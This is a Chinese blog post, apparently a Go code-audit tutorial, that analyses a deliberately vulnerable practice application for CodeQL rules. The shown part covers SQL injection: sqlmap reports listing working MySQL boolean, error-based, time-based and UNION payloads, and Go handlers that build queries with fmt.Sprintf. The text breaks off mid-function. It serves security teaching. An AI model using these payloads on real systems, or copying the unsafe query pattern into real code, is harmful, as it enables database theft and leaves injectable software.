<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"lya0.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Codeql 规则go靶场分析">
<meta property="og:type" content="article">
<meta property="og:title" content="Go代码审计（Codeql）">
<meta property="og:url" content="https://lya0.github.io/2023/04/20/codeql-GoSecCode/index.html">
<meta property="og:site_name" content="Lya0">
<meta property="og:description" content="Codeql 规则go靶场分析">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/windows/202502191423684.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/windows/202502191424072.png">
<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/windows/202502191424731.png">
<meta property="article:published_time" content="2023-04-20T07:26:00.000Z">
<meta property="article:modified_time" content="2025-02-19T06:24:29.943Z">
<meta property="article:author" content="Lya0">
<meta property="article:tag" content="web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/windows/202502191423684.png">


<link rel="canonical" href="https://lya0.github.io/2023/04/20/codeql-GoSecCode/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lya0.github.io/2023/04/20/codeql-GoSecCode/","path":"2023/04/20/codeql-GoSecCode/","title":"Go代码审计（Codeql）"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Go代码审计（Codeql） | Lya0</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Lya0</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/atom.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Codeql-%E8%A7%84%E5%88%99%E9%9D%B6%E5%9C%BA%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">Codeql 规则靶场分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">整型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-go-xorm-xorm"><span class="nav-number">2.3.</span> <span class="nav-text">github.com&#x2F;go-xorm&#x2F;xorm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-Masterminds-squirrel"><span class="nav-number">2.4.</span> <span class="nav-text">github.com&#x2F;Masterminds&#x2F;squirrel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-uptrace-bun"><span class="nav-number">2.5.</span> <span class="nav-text">github.com&#x2F;uptrace&#x2F;bun</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-jinzhu-gorm"><span class="nav-number">2.6.</span> <span class="nav-text">github.com&#x2F;jinzhu&#x2F;gorm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-rqlite-gorqlite"><span class="nav-number">2.7.</span> <span class="nav-text">github.com&#x2F;rqlite&#x2F;gorqlite</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-go-pg-pg"><span class="nav-number">2.8.</span> <span class="nav-text">github.com&#x2F;go-pg&#x2F;pg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-go-pg-pg-v10"><span class="nav-number">2.9.</span> <span class="nav-text">github.com&#x2F;go-pg&#x2F;pg&#x2F;v10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-jmoiron-sqlx"><span class="nav-number">2.10.</span> <span class="nav-text">github.com&#x2F;jmoiron&#x2F;sqlx</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github-com-gogf-gf"><span class="nav-number">2.11.</span> <span class="nav-text">github.com&#x2F;gogf&#x2F;gf</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NoSql%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">NoSql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.</span> <span class="nav-text">普通注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Git%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="nav-number">4.2.</span> <span class="nav-text">Git参数注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#os-StartProcess"><span class="nav-number">4.3.</span> <span class="nav-text">os.StartProcess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session-CombinedOutput"><span class="nav-number">4.4.</span> <span class="nav-text">session.CombinedOutput</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sh-Command"><span class="nav-number">4.5.</span> <span class="nav-text">sh.Command</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#syscall-Exec"><span class="nav-number">4.6.</span> <span class="nav-text">syscall.Exec</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">模版注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sprig"><span class="nav-number">5.1.</span> <span class="nav-text">sprig</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-template"><span class="nav-number">5.2.</span> <span class="nav-text">html&#x2F;template</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-number">5.3.</span> <span class="nav-text">xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">5.4.</span> <span class="nav-text">信息泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rce"><span class="nav-number">5.5.</span> <span class="nav-text">rce</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">6.</span> <span class="nav-text">重定向</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cors"><span class="nav-number">7.</span> <span class="nav-text">cors</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xxe"><span class="nav-number">8.</span> <span class="nav-text">xxe</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ssrf"><span class="nav-number">9.</span> <span class="nav-text">ssrf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9Cnet-http%E2%80%9D"><span class="nav-number">9.1.</span> <span class="nav-text">“net&#x2F;http”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#websocket"><span class="nav-number">9.2.</span> <span class="nav-text">websocket</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#golang-org-x-net-websocket"><span class="nav-number">9.2.1.</span> <span class="nav-text">golang.org&#x2F;x&#x2F;net&#x2F;websocket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#github-com-gorilla-websocket"><span class="nav-number">9.2.2.</span> <span class="nav-text">github.com&#x2F;gorilla&#x2F;websocket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nhooyr-io-websocket"><span class="nav-number">9.2.3.</span> <span class="nav-text">nhooyr.io&#x2F;websocket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#github-com-gobwas-ws"><span class="nav-number">9.2.4.</span> <span class="nav-text">github.com&#x2F;gobwas&#x2F;ws</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#github-com-sacOO7-gowebsocket"><span class="nav-number">9.2.5.</span> <span class="nav-text">github.com&#x2F;sacOO7&#x2F;gowebsocket</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">10.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jsonp"><span class="nav-number">11.</span> <span class="nav-text">jsonp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRLF"><span class="nav-number">12.</span> <span class="nav-text">CRLF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS"><span class="nav-number">13.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">14.</span> <span class="nav-text">目录穿越</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">14.1.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zipslip"><span class="nav-number">14.2.</span> <span class="nav-text">zipslip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tarslip"><span class="nav-number">14.3.</span> <span class="nav-text">tarslip</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">15.</span> <span class="nav-text">文件上传</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Lya0</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Lya0" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Lya0" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lya0.github.io/2023/04/20/codeql-GoSecCode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Lya0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lya0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Go代码审计（Codeql） | Lya0">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Go代码审计（Codeql）
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-04-20 15:26:00" itemprop="dateCreated datePublished" datetime="2023-04-20T15:26:00+08:00">2023-04-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-19 14:24:29" itemprop="dateModified" datetime="2025-02-19T14:24:29+08:00">2025-02-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>Codeql 规则go靶场分析</p>
<span id="more"></span>

<h1 id="Codeql-规则靶场分析"><a href="#Codeql-规则靶场分析" class="headerlink" title="Codeql 规则靶场分析"></a>Codeql 规则靶场分析</h1><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><table>
<thead>
<tr>
<th><strong>package</strong></th>
<th><strong>函数</strong></th>
</tr>
</thead>
<tbody><tr>
<td>database&#x2F;sql</td>
<td>Query,QueryRow,QueryContext,QueryRowContext</td>
</tr>
<tr>
<td>gorm</td>
<td>Exec,Raw,Select,Where</td>
</tr>
<tr>
<td>xorm</td>
<td>Query,QueryString,SQL,Where,And</td>
</tr>
</tbody></table>
<h2 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a>整型注入</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of <span class="number">50</span> HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id=<span class="number">1</span> AND <span class="number">1415</span>=<span class="number">1415</span></span><br><span class="line">    Vector: AND [INFERENCE]</span><br><span class="line"></span><br><span class="line">    Type: <span class="type">error</span>-based</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.6</span> AND <span class="type">error</span>-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id=<span class="number">1</span> AND GTID_SUBSET(CONCAT(<span class="number">0x716a716271</span>,(SELECT (ELT(<span class="number">7204</span>=<span class="number">7204</span>,<span class="number">1</span>))),<span class="number">0x716a6a7871</span>),<span class="number">7204</span>)</span><br><span class="line">    Vector: AND GTID_SUBSET(CONCAT(<span class="string">&#x27;[DELIMITER_START]&#x27;</span>,([QUERY]),<span class="string">&#x27;[DELIMITER_STOP]&#x27;</span>),[RANDNUM])</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=<span class="number">1</span> AND (SELECT <span class="number">4617</span> FROM (SELECT(SLEEP(<span class="number">5</span>)))XCtJ)</span><br><span class="line">    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],<span class="number">0</span>,[SLEEPTIME])))))[RANDSTR])</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - <span class="number">3</span> columns</span><br><span class="line">    Payload: id=<span class="number">-3115</span> UNION ALL SELECT CONCAT(<span class="number">0x716a716271</span>,<span class="number">0x7359555345596f76505465414d51497863706873574b647876487a497348465a545164426c496248</span>,<span class="number">0x716a6a7871</span>),NULL,NULL-- -</span><br><span class="line">    Vector:  UNION ALL SELECT [QUERY],NULL,NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>库</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;database/sql&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>顾名思义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SqlInjectionVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	id := c.GetString(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, source)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	err = db.Ping()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> db.Close()</span><br><span class="line">	sqlStr := fmt.Sprintf(<span class="string">&quot;select * from user where id=%s&quot;</span>, id)</span><br><span class="line">	user := models.User&#123;&#125;</span><br><span class="line">	err = db.QueryRow(sqlStr).Scan(&amp;user.Id, &amp;user.Username, &amp;user.Password)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	output, err := json.Marshal(user)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">&#125;</span><br><span class="line">sqlStr := fmt.Sprintf(<span class="string">&quot;select * from user where id=%s&quot;</span>, id)</span><br><span class="line">user := models.User&#123;&#125;</span><br><span class="line">err = db.QueryRow(sqlStr).Scan(&amp;user.Id, &amp;user.Username, &amp;user.Password)</span><br></pre></td></tr></table></figure>

<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of <span class="number">50</span> HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: username (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: username=admin<span class="string">&quot; AND 2486=2486#</span></span><br><span class="line"><span class="string">    Vector: AND [INFERENCE]#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span></span><br><span class="line"><span class="string">    Payload: username=admin&quot;</span> AND GTID_SUBSET(CONCAT(<span class="number">0x71706b7171</span>,(SELECT (ELT(<span class="number">9032</span>=<span class="number">9032</span>,<span class="number">1</span>))),<span class="number">0x717a716b71</span>),<span class="number">9032</span>)-- OyBK</span><br><span class="line">    Vector: AND GTID_SUBSET(CONCAT(<span class="string">&#x27;[DELIMITER_START]&#x27;</span>,([QUERY]),<span class="string">&#x27;[DELIMITER_STOP]&#x27;</span>),[RANDNUM])</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=admin<span class="string">&quot; AND (SELECT 5078 FROM (SELECT(SLEEP(5)))GpnN)-- Jwsu</span></span><br><span class="line"><span class="string">    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 3 columns</span></span><br><span class="line"><span class="string">    Payload: username=-7975&quot;</span> UNION ALL SELECT CONCAT(<span class="number">0x71706b7171</span>,<span class="number">0x527271564d4172474644584347534758526d4e786a7248705245536365645a73764f6a77476a4a4e</span>,<span class="number">0x717a716b71</span>),NULL,NULL#</span><br><span class="line">    Vector:  UNION ALL SELECT [QUERY],NULL,NULL#</span><br><span class="line">---</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SqlInjectionVuln2Controller)</span></span> Get() &#123;</span><br><span class="line">	username := c.GetString(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, source)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	err = db.Ping()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> db.Close()</span><br><span class="line">	sqlStr := fmt.Sprintf(<span class="string">&quot;select * from user where username=\&quot;%s\&quot;&quot;</span>, username)</span><br><span class="line">	user := models.User&#123;&#125;</span><br><span class="line">	err = db.QueryRow(sqlStr).Scan(&amp;user.Id, &amp;user.Username, &amp;user.Password)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	output, err := json.Marshal(user)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同理</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlStr := fmt.Sprintf(<span class="string">&quot;select * from user where username=\&quot;%s\&quot;&quot;</span>, username)</span><br><span class="line">user := models.User&#123;&#125;</span><br><span class="line">err = db.QueryRow(sqlStr).Scan(&amp;user.Id, &amp;user.Username, &amp;user.Password)</span><br></pre></td></tr></table></figure>



<h2 id="github-com-go-xorm-xorm"><a href="#github-com-go-xorm-xorm" class="headerlink" title="github.com&#x2F;go-xorm&#x2F;xorm"></a>github.com&#x2F;go-xorm&#x2F;xorm</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SqlInjectionVuln3Controller)</span></span> Get() &#123;</span><br><span class="line">	username := c.GetString(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	field := c.GetString(<span class="string">&quot;field&quot;</span>)</span><br><span class="line">	engine, err := xorm.NewEngine(<span class="string">&quot;mysql&quot;</span>, source)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	engine.ShowSQL(<span class="literal">true</span>)</span><br><span class="line">	user := models.User&#123;&#125;</span><br><span class="line">	session := engine.Prepare().And(fmt.Sprintf(<span class="string">&quot;%s like ?&quot;</span>, field), username)</span><br><span class="line">	ok, err := session.Get(&amp;user)</span><br><span class="line">	<span class="keyword">if</span> !ok &amp;&amp; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	